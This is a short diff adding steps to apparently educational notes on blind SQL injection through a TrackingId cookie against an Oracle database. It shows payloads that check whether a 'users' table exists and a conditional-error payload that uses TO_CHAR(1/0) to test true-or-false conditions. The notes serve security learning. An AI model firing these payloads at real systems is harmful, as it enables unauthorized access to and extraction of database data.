@@ -27,3 +27,8 @@ TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
 TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
 
 --As this query does not return an error, you can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.
+
+--You can also exploit this behavior to test conditions. First, submit the following query:
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+
+--Verify that an error message is received.
